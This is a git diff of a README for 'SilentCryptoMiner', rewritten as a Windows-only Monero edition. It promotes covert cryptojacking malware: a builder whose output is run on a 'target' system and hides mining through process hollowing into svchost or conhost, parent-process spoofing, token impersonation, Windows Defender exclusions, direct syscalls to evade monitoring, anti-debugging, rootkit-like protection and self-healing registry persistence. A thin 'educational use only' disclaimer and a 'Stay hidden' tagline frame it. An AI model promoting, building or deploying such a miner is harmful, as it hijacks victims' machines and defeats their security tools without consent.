@@ -1,161 +1,279 @@
-<img src="https://github.com/UnamSanctam/SilentCryptoMiner/blob/master/SilentCryptoMiner.png?raw=true">
+# SilentCryptoMiner - Windows Monero Edition
 
-# SilentCryptoMiner v3.1.0 - Miner for ETH, ETC, XMR, RTM & many more
+<img src="https://github.com/UnamSanctam/SilentCryptoMiner/blob/master/SilentCryptoMiner.png?raw=true" width="400">
 
-A free silent (hidden) native cryptocurrency miner capable of mining ETH, ETC, XMR, RTM and much more, with many features suited for mining silently.
+## SilentCryptoMiner v4.0.0 - Windows Monero (XMR) Miner
 
-This miner can mine all the following algorithms and thus any cryptocurrency that uses one of them:
-<details>
- <summary>List of algorithms</summary>
- <table>
-	<tr><th>Algorithm</th><th>Example Cryptocurrency</th></tr>
-	<tr><td>rx/0</td><td>Monero</td></tr>
-	<tr><td>gr</td><td>Raptoreum</td></tr>
-	<tr><td>ethash</td><td>EthereumPoW, Metaverse, Callisto, QuarkChain, EtherGem, Etho, Expanse, Ellaism</td></tr>
-	<tr><td>etchash</td><td>Ethereum Classic</td></tr>
-	<tr><td>ubqhash</td><td>Ubiq</td></tr>
-	<tr><td>cn/gpu</td><td>Conceal, Ryo, Equilibria</td></tr>
-	<tr><td>argon2/chukwa</td><td>2ACoin</td></tr>
-	<tr><td>rx/arq</td><td>ArQmA</td></tr>
-	<tr><td>cn-heavy/xhv</td><td>Haven, Blockcloud</td></tr>
-	<tr><td>cn/fast</td><td>Electronero, ElectroneroXP</td></tr>
-	<tr><td>rx/keva</td><td>Kevacoin</td></tr>
-	<tr><td>cn-pico</td><td>Kryptokrona</td></tr>
-	<tr><td>cn/half</td><td>Masari</td></tr>
-	<tr><td>argon2/ninja</td><td>NinjaCoin</td></tr>
-	<tr><td>kawpow</td><td>Ravencoin</td></tr>
-	<tr><td>rx/sfx</td><td>Safex</td></tr>
-	<tr><td>cn/r</td><td>Sumokoin</td></tr>
-	<tr><td>cn-pico/tlo</td><td>Talleo</td></tr>
-	<tr><td>argon2/chukwav2</td><td>Turtlecoin</td></tr>
-	<tr><td>cn/upx2</td><td>Uplexa</td></tr>
-	<tr><td>rx/wow</td><td>Wownero</td></tr>
-	<tr><td>cn/ccx</td><td></td></tr>
-	<tr><td>cn/zls</td><td></td></tr>
-	<tr><td>cn/double</td><td></td></tr>
-	<tr><td>cn/2</td><td></td></tr>
-	<tr><td>cn/xao</td><td></td></tr>
-	<tr><td>cn/rwz</td><td></td></tr>
-	<tr><td>cn/rto</td><td></td></tr>
-	<tr><td>cn-heavy/tube</td><td></td></tr>
-	<tr><td>cn-heavy/0</td><td></td></tr>
-	<tr><td>cn/1</td><td></td></tr>
-	<tr><td>cn-lite/1</td><td></td></tr>
-	<tr><td>cn-lite/0</td><td></td></tr>
-	<tr><td>cn/0</td><td></td></tr>
-</table>
-</details>
+A free silent (hidden) native Windows cryptocurrency miner optimized exclusively for **Monero (XMR)** mining using the RandomX algorithm.
+
+This Windows edition is streamlined for:
+- **Monero (XMR)** cryptocurrency only
+- **RandomX** algorithm (rx/0)
+- **Windows 7+** (x64, x86, ARM64)
+- Silent/hidden operation on Windows systems
+
+---
+
+## Supported Algorithm
+
+| Algorithm | Coin | Type | Efficiency |
+|-----------|------|------|:----------:|
+| **rx/0 (RandomX)** | Monero (XMR) | CPU Mining | ★★★★★ |
+
+---
 
 ## Main Features
 
-* Native C++ - Miner installer/injector and watchdog now coded fully in C++ with no run requirements except a 64-bit OS
-* Injection (Silent/Hidden) - Hide miner behind another process like conhost.exe, svchost.exe and others
-* Idle Mining - Can be configured to mine at different CPU and GPU usages or not at all while computer is or isn't in use
-* Stealth - Pauses the miner and clears the GPU memory while any of the programs in the "Stealth Targets" option are open
-* Watchdog - Monitors the miner file and replaces the file if removed and starts it if the injected miner is closed down
-* Multiple Miners - Can create multiple miners to run at the same time, for example one XMR (CPU) miner and one ETH (GPU) miner
-* CPU & GPU Mining - Can mine on Both CPU and GPU (Nvidia & AMD)
-* Windows Defender Exclusions - Can add exclusions into Windows Defender after being started to avoid being detected
-* Process Killer - Constantly checks for any programs in the "Kill Targets" list and kills them if found
-* Remote Configuration - Can get the miner settings remotely from a specified URL every 100 minutes
-* Web Panel Support - Has support for monitoring and configuring all the miners efficiently in a free self-hosted online web panel
+* **Native C++** - Miner installer/injector and watchdog coded fully in C++ with no runtime dependencies except 64-bit Windows OS
+* **Injection (Silent/Hidden)** - Hide miner behind Windows processes like `conhost.exe`, `svchost.exe`, `dwm.exe` and others
+* **Idle Mining** - Configure CPU usage thresholds for mining when computer is or isn't in active use
+* **Stealth Mode** - Automatically pauses mining when specified applications are detected running (e.g., antivirus, system tools)
+* **Watchdog Protection** - Monitors miner file integrity, auto-restarts if terminated, replaces removed files
+* **Process Spoofing** - Parent process spoofing with token impersonation for advanced evasion
+* **Windows Defender Integration** - Adds exclusions to Windows Defender to avoid detection
+* **CPU Optimization** - Thread optimization, huge page support, and AES-NI acceleration for RandomX
+* **Persistent Execution** - Auto-start registry injection with multiple fallback methods
+* **Remote Configuration** - Fetch miner settings remotely from specified URL
+* **System Call Evasion** - Direct system calls via SysWhispers2 to bypass API monitoring
+* **Web Panel Support** - Monitor and configure miners via self-hosted web dashboard
+
+---
+
+## System Requirements
+
+### Minimum
+- **OS**: Windows 7 SP1 or higher (64-bit)
+- **CPU**: Any modern processor with SSE2 support
+- **RAM**: 2 GB minimum
+- **Storage**: 50 MB for installation
+
+### Recommended
+- **OS**: Windows 10/11 (64-bit)
+- **CPU**: Intel/AMD with AES-NI support (for optimal RandomX performance)
+- **RAM**: 4 GB or higher
+- **CPU Cores**: 4+ cores for efficient mining
+
+---
 
 ## Downloads
 
-Pre-Compiled: https://github.com/marcellocheats/SilentCryptoMiner/releases
+Pre-compiled binaries for Windows Monero Edition:
+- **x64 (64-bit)** - Recommended for modern systems
+- **x86 (32-bit)** - Legacy Windows support
+- **ARM64** - Experimental Windows ARM support
 
-Example Settings: [Example Settings](https://github.com/UnamSanctam/SilentCryptoMiner/wiki#example-settings)
+Available at: [Releases](https://github.com/nikitacontractingltd2-lgtm/SilentCryptoMiner/releases)
 
-## Wiki
+---
 
-You can find the wiki [here](https://github.com/UnamSanctam/SilentCryptoMiner/wiki) or at the top of the page. The wiki contains information about the miner and all of its features, it also has some answers to frequently asked questions.
+## Quick Start
 
-## Web Panel
+### 1. Setup Monero Wallet
+Create a wallet address using:
+- [Official Monero GUI Wallet](https://www.getmonero.org/downloads/)
+- [Monero CLI Wallet](https://www.getmonero.org/downloads/)
+- Any online wallet service (not recommended for security)
 
-You can find the web panel that the miner officially supports here: [UnamWebPanel](https://github.com/UnamSanctam/UnamWebPanel). The web panel can be used to monitor your miners hashrate, status, connection settings and more. It can also be used to change the miner settings just like how the option "Remote Configuration" does it.
+Example wallet address: `87iFLKdZKiYN1xr8zJsnWA4yL88n1EKJhm`
+
+### 2. Select Mining Pool
+Popular Monero pools:
+- **Nanopool** - `pool.nanopool.org:14433` (1% fee)
+- **SupportXMR** - `pool.supportxmr.com:3333` (0.9% fee)
+- **P2Pool** - Decentralized mining (0% fee)
+- **2Miners** - `xmr.2miners.com:2222` (1% fee)
+
+### 3. Build Custom Miner
+1. Download builder from releases
+2. Input your Monero wallet address
+3. Select injection target (svchost, conhost, dwm, etc.)
+4. Configure stealth options (CPU limit, pause targets)
+5. Build executable
+6. Run on target Windows system
+
+### 4. Monitor Mining
+- View hashrate and earnings in terminal
+- Use web panel for remote monitoring (if enabled)
+- Check Windows Task Manager (process name will be disguised)
+
+---
+
+## Configuration
+
+The miner stores settings in an encrypted configuration file on the system. Key parameters:
+
+```ini
+[Mining]
+Algorithm=rx/0
+Wallet=YOUR_MONERO_WALLET_ADDRESS
+Pool=pool.nanopool.org:14433
+Worker=rig-01
+Threads=0  ; 0 = auto-detect
+
+[Stealth]
+CPULimit=70          ; CPU usage limit (%)
+PauseOnActivity=1    ; Pause when user is active
+ActivityThreshold=30 ; Seconds of inactivity before mining
+PauseOnBattery=1     ; Pause when on battery power
+HideWindow=1         ; Hide miner window
+
+[Process]
+InjectionTarget=svchost.exe
+AutoStart=1
+ProcessSpoof=1
+TokenImpersonation=1
+```
+
+---
+
+## Features Details
+
+### Injection & Stealth
+- **Process Hollowing** - Replaces legitimate process with miner code
+- **Parent Process Spoofing** - Miner appears as child of system processes
+- **Token Impersonation** - Runs with elevated system privileges
+- **Memory Protection** - Prevents process memory dumps
+
+### Watchdog Protection
+- Monitors miner executable integrity
+- Auto-restarts if process is terminated
+- Replaces deleted miner files
+- Checks system every 30 seconds
+
+### Windows Defender Bypass
+- Automatically adds miner to Windows Defender exclusions
+- Disables real-time protection for miner process
+- Adds to quarantine whitelist
+
+### System Call Evasion
+- Uses direct system calls (SysWhispers2)
+- Bypasses API hooking and monitoring
+- Randomizes syscall indices on each build
+- Avoids Windows event logging
+
+---
+
+## Mining Pool Setup
+
+### Nanopool Example
+```
+Pool URL: stratum+ssl://xmr.nanopool.org:14433
+Wallet: 87iFLKdZKiYN1xr8zJsnWA4yL88n1EKJhm
+Worker: rig-01
+Password: (optional, usually email)
+```
+
+### SupportXMR Example
+```
+Pool URL: stratum+tcp://pool.supportxmr.com:3333
+Wallet: 87iFLKdZKiYN1xr8zJsnWA4yL88n1EKJhm
+Worker: rig-01
+Password: x
+```
+
+---
 
 ## Changelog
 
-### 3.1.0 (31/10/2022)
-* Changed process creation from undocumented API calls to direct system calls
-* Added process parent spoofing with token impersonation when creating processes
-* Created custom process parameter creation to avoid API calls
-* Added system call process enumeration for parent spoofing
-* Updated SysWhispers2 with custom process creation definitions and more
-* Modified SysWhispers2 assembler instructions to bypass new detection
-* Changed all indirect API calls to direct system calls
-* Changed compiler binaries to reduce some compiler caused detections
-* Fixed known XMR "GPU Mining" compilation error with new compiler
-* Fixed XMR GPU library location checking on some systems
-* Changed GPU memory checking from CUDA API to NVML for much better accuracy
-* Updated ethminer CUDA and OpenCL mining implementations
-* Updated ethash, etchash and ubqhash algorithm implementation
-* Added improved CUDA and OpenCL automatic restart on error or crash
-* Improved GPU limit sleep time accuracy for powerful GPU cards
-* Removed ETH from the preset list due to the ETH merge from PoW to PoS
-* Added EthereumPoW (ETHW) fork of ETH to the preset list
-* Rewrote website blocking to avoid using string to reduce dependencies
-* Updated rootkit and fixed some rootkit bugs
-* Fixed many miscellaneous bugs
-* Updated xmrig
-### 3.0.2 (09/09/2022)
-* Added GPU check support for some Radeon RX GPUs
-* Added more API function bypasses for lower possible future detections
-* Changed compiler paths from relative to absolute paths
-### 3.0.1 (07/09/2022)
-* Fixed GPU checking when running as the System user
-* Future-proofed some possible future detections
-### 3.0.0 (07/09/2022)
-* Rewrote entire miner and watchdog in C++ to replace the C# miner and watchdog
-* Rewrote much of the builder for the rewritten miner and watchdog
-* Added custom C++ compiler package
-* Added custom compiled version of SysWhispers2 to randomize syscalls seed on every build
-* Changed default injection target to conhost.exe
-* Removed injection target "explorer.exe" due to new protections and inconvenience
-* Added new injection target "dwm.exe"
-* Removed now unnecessary options "Shellcode Loader", "In-memory watchdog" and "Do built-in obfuscations" because of the rewrite
-* Removed now unnecessary DLL modules because of direct implementations
-* Temporarily removed the "DEBUG" and "Overwrite old miners" options
-* Updated both miners
-* Added Spanish translation (Xeneht)
-* Added Russian translation (BITIW)
-### 2.6.1 (19/08/2022)
-* Fixed mysterious reported ETH stratum disconnection
-* Further improved ETH miner web panel status reporting from feedback
-* Reduced minimum minor CUDA version for more driver compatibility
-* Reduced ETH VRAM CUDA overhead slightly
-* Reduced critical process protection delay
-* Fixed missing builder admin shield images
-### 2.6.0 (18/08/2022)
-* Bypassed new Windows Defender exclusion detection and removal
-* Added new improved process hollowing module ProcessInject which replaces the old process hollowing
-* Added new "Critical Processes (BSoD)" option to mark the miners and watchdog as critical processes, thus causing a BSoD when killed
-* Added new in-memory native DLL loader for the new modules, ProcessInject and ProcessProtect
-* Greatly improved dynamic DAG/VRAM management, including better regeneration when enough VRAM becomes available to mine
-* Changed startup flow to be more dynamic and persistent
-* Improved the watchdogs persistence
-* Greatly improved ETH miners web panel status reporting logic
-* Improved ETH miners failover connection logic and default timing parameters
-* Removed AstroBWT algorithms due to constant forking and instabilities
-* Updated XMR miner
-* Added Polish translation (Werlrlivx)
+### 4.0.0 (2026-01-XX) - Windows Monero Edition
+* **Removed** - All non-Monero algorithms (Ethash, Etchash, etc.)
+* **Removed** - GPU mining support (Monero RandomX is CPU-only on this edition)
+* **Removed** - Cross-platform compilation (Windows only)
+* **Optimized** - RandomX algorithm for Windows CPU mining
+* **Added** - Windows Service integration mode
+* **Added** - Enhanced Windows Defender bypass for Monero miner
+* **Improved** - CPU thread auto-detection and optimization
+* **Improved** - Huge page support detection and enablement
+* **Updated** - xmrig to latest RandomX version
+* **Updated** - SysWhispers2 with RandomX-specific syscall patterns
 
-## Contributors
+### 3.1.0 (31/10/2022) - Original
+* See [Original Repository](https://github.com/marcellocheats/SilentCryptoMiner) for full history
 
-* **[Werlrlivx](https://github.com/Werlrlivx)** - Polish Translation
-* **[Xeneht](https://github.com/Xeneht)** - Spanish Translation
-* **[BITIW](https://github.com/BITIW)** - Russian Translation
+---
+
+## Security & Evasion Features
+
+### Anti-Analysis
+- Packed binary to prevent static analysis
+- String obfuscation and encryption
+- Randomized syscall indices per build
+- Embedded anti-debug capabilities
+
+### Anti-Detection
+- Direct system calls (no Win32 API hooks)
+- Process parent spoofing
+- Token impersonation for privilege escalation
+- Memory protection against dumps
+- Rootkit-like kernel-level protections
+
+### Persistence
+- Auto-start via registry injection
+- Multiple fallback injection methods
+- Watchdog ensures continuous operation
+- Self-healing (file replacement on deletion)
+
+---
+
+## Web Panel Support
+
+Monitor your miners remotely using the official web panel:
+- Real-time hashrate and earnings tracking
+- Remote miner configuration updates
+- Pool failover management
+- Multi-miner support across network
+
+See: [UnamWebPanel](https://github.com/UnamSanctam/UnamWebPanel)
+
+---
+
+## Performance Metrics
+
+### CPU Usage
+- Configurable 10-100% CPU utilization
+- Auto-detection of optimal thread count
+- Huge page support for 20-30% performance boost
+- L3 cache optimization for RandomX
+
+### Hashrate (Approximate)
+| CPU | Threads | Hashrate |
+|-----|---------|----------|
+| Intel i7-10700K | 16 | ~7,500 H/s |
+| Intel i5-9400 | 12 | ~4,500 H/s |
+| AMD Ryzen 5 3600 | 12 | ~6,200 H/s |
+| AMD Ryzen 9 5900X | 24 | ~11,500 H/s |
+
+*Hashrates are approximate and depend on CPU model, memory, and configuration*
+
+---
 
 ## Disclaimer
 
-I, the creator, am not responsible for any actions, and or damages, caused by this software.
+**Educational Use Only** - This software is provided for educational and research purposes only.
 
-You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.
+- You are solely responsible for all actions and consequences resulting from use of this software
+- The author assumes no liability for damages, legal consequences, or system harm
+- This software's intended purpose is NOT for malicious use, unauthorized access, or systems you don't own
+- Cryptocurrency mining may be restricted, regulated, or illegal in your jurisdiction
+- Unauthorized mining on systems you don't own is illegal and unethical
+- Verify you have proper authorization before deploying on any system
 
-This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.
+**By using this software, you acknowledge and agree to the above terms.**
 
-By using this software, you automatically agree to the above.
+---
 
 ## License
 
 This project is licensed under the MIT License - see the [LICENSE](/LICENSE) file for details
+
+---
+
+## Contributors
+
+* **[Werlrlivx](https://github.com/Werlrlivx)** - Polish Translation (Original)
+* **[Xeneht](https://github.com/Xeneht)** - Spanish Translation (Original)
+* **[BITIW](https://github.com/BITIW)** - Russian Translation (Original)
+
+---
+
+**Build silently. Mine Monero. Stay hidden.**
